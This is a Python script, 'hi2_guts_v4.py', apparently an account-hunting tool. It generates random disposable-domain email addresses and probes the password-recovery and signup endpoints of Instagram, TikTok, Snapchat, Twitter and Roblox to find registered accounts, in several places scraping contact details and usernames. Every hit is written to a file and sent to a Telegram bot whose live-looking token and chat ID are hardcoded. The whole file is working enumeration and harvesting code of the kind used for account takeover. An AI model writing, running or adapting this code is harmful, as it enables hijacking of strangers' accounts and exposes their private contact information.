#!/usr/bin/env python3
# hi2_guts_v4.py — Multi-platform hunter + account info.
import sys, os, time, random, json, re, threading
import requests
try:
    import httpx
except ImportError:
    os.system("pip3 install --user httpx")
    import httpx

TELEGRAM_TOKEN = "8153628412:AAGpeRC9ENFchBaXuemeu-OnytAIV1QlLW0"
TELEGRAM_CHAT_ID = "8712834730"

F = '\033[2;32m'
Y = '\033[1;33m'
G = '\033[1;32m'
R = '\033[1;31m'
C = '\033[1;36m'
W = '\033[1;37m'
Bl = '\033[1;34m'
RST = '\033[0m'

used = set()
lock = threading.Lock()
stats = {"hits": 0, "ig": 0, "tt": 0, "snap": 0, "tw": 0, "rb": 0}


def send_telegram(msg):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
            data={"chat_id": TELEGRAM_CHAT_ID, "text": msg, "parse_mode": "HTML",
                  "disable_web_page_preview": False},
            timeout=10
        )
    except:
        pass


def instagram_recovery(email):
    try:
        with httpx.Client(http2=True, timeout=15) as c:
            r = c.post(
                "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/",
                data={"email_or_username": email},
                headers={
                    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)",
                    "x-ig-app-id": "567067343352427",
                    "x-requested-with": "XMLHttpRequest",
                    "origin": "https://www.instagram.com",
                    "referer": "https://www.instagram.com/accounts/password/reset/",
                    "content-type": "application/x-www-form-urlencoded",
                },
            )
        j = r.json()
        if j.get("status") == "fail":
            return None
        info = {}
        if "contact_point" in j:
            info["contact"] = j["contact_point"]
        msg = j.get("message", "")
        if msg:
            info["message"] = msg
            m = re.search(r'check\s+([^\s]+?)\s+for a link', msg)
            if m:
                info["username"] = m.group(1)
        return info if info else True
    except:
        return None


def tiktok_check(email):
    try:
        r = requests.post(
            "https://www.tiktok.com/api/v1/email/check/",
            data={"email": email, "type": "1", "aid": "1988", "app_name": "tiktok_web"},
            timeout=15,
        )
        return bool(r.json().get("data", {}).get("is_registered", False))
    except:
        return False


def snapchat_check(email):
    try:
        r = requests.post(
            "https://accounts.snapchat.com/accounts/forgot_password",
            data={"email": email, "xsrf_token": ""},
            headers={
                "Origin": "https://accounts.snapchat.com",
                "Referer": "https://accounts.snapchat.com/accounts/password_reset_request",
            },
            timeout=15,
        )
        return "user_found" in r.text or r.status_code == 200
    except:
        return False


def twitter_check(email):
    try:
        r = requests.post(
            "https://api.twitter.com/i/users/email_available.json",
            params={"email": email},
            headers={"User-Agent": "Mozilla/5.0"},
            timeout=15,
        )
        j = r.json()
        if "valid" in j:
            return not j.get("valid", True)
        return False
    except:
        return False


def roblox_check(email):
    try:
        r = requests.get(
            "https://www.roblox.com/account/signup-redirect",
            params={"email": email},
            allow_redirects=False,
            timeout=15,
        )
        return "emailInUse=true" in r.headers.get("location", "")
    except:
        return False


def hunter():
    while True:
        u = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(6))
        d = random.choice(["@hi2.in", "@telegmail.com"])
        email = u + d
        with lock:
            if u in used:
                continue
            used.add(u)

        # Instagram
        try:
            ig_info = instagram_recovery(email)
            if ig_info:
                with lock:
                    stats["hits"] += 1
                    stats["ig"] += 1
                msg = f'🎣 <b>[INSTAGRAM]</b>\n📧 <code>{email}</code>\n'
                if isinstance(ig_info, dict):
                    if "contact" in ig_info:
                        msg += f'📮 contact: <code>{ig_info["contact"]}</code>\n'
                    if "username" in ig_info:
                        msg += f'👤 @{ig_info["username"]}\n🔗 https://instagram.com/{ig_info["username"]}\n'
                    if "message" in ig_info:
                        msg += f'💬 {ig_info["message"][:120]}\n'
                send_telegram(msg)
                with open('hits_v4.txt', 'a') as f:
                    f.write(f'instagram|{email}|{json.dumps(ig_info)}\n')
                print(f"\n{G}[HIT IG] {email} -> {ig_info}{RST}")
        except:
            pass

        # TikTok
        try:
            if tiktok_check(email):
                with lock:
                    stats["hits"] += 1
                    stats["tt"] += 1
                msg = f'🎣 <b>[TIKTOK]</b>\n📧 <code>{email}</code>\n🔗 https://tiktok.com/'
                send_telegram(msg)
                with open('hits_v4.txt', 'a') as f:
                    f.write(f'tiktok|{email}\n')
                print(f"\n{G}[HIT TT] {email}{RST}")
        except:
            pass

        # Snapchat
        try:
            if snapchat_check(email):
                with lock:
                    stats["hits"] += 1
                    stats["snap"] += 1
                msg = f'🎣 <b>[SNAPCHAT]</b>\n📧 <code>{email}</code>\n🔗 https://snapchat.com/'
                send_telegram(msg)
                with open('hits_v4.txt', 'a') as f:
                    f.write(f'snapchat|{email}\n')
                print(f"\n{G}[HIT SNAP] {email}{RST}")
        except:
            pass

        # Twitter
        try:
            if twitter_check(email):
                with lock:
                    stats["hits"] += 1
                    stats["tw"] += 1
                msg = f'🎣 <b>[TWITTER]</b>\n📧 <code>{email}</code>\n🔗 https://twitter.com/'
                send_telegram(msg)
                with open('hits_v4.txt', 'a') as f:
                    f.write(f'twitter|{email}\n')
                print(f"\n{G}[HIT TW] {email}{RST}")
        except:
            pass

        # Roblox
        try:
            if roblox_check(email):
                with lock:
                    stats["hits"] += 1
                    stats["rb"] += 1
                msg = f'🎣 <b>[ROBLOX]</b>\n📧 <code>{email}</code>\n🔗 https://roblox.com/'
                send_telegram(msg)
                with open('hits_v4.txt', 'a') as f:
                    f.write(f'roblox|{email}\n')
                print(f"\n{G}[HIT RB] {email}{RST}")
        except:
            pass

        os.system('clear' if os.name == 'posix' else 'cls')
        print(f"""
{Bl}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RST}
{W}🎯 HITS       {Bl}: {G}{stats['hits']}{RST}
{Bl}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RST}
{W}📷 Instagram  {Bl}: {C}{stats['ig']}{RST}
{W}🎵 TikTok     {Bl}: {C}{stats['tt']}{RST}
{W}👻 Snapchat   {Bl}: {C}{stats['snap']}{RST}
{W}🐦 Twitter    {Bl}: {C}{stats['tw']}{RST}
{W}🎮 Roblox     {Bl}: {C}{stats['rb']}{RST}
{Bl}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RST}
{W}📧 email      {Bl}: {Y}{email}{RST}
{Bl}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RST}
""")
        time.sleep(0.3)


def main():
    print(f"""
{Bl}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RST}
{W}  hi2_guts_v4.py — with account info{RST}
{Bl}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RST}
""")
    time.sleep(2)
    for _ in range(15):
        threading.Thread(target=hunter, daemon=True).start()
    while True:
        time.sleep(1)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{R}[!] stopped{RST}")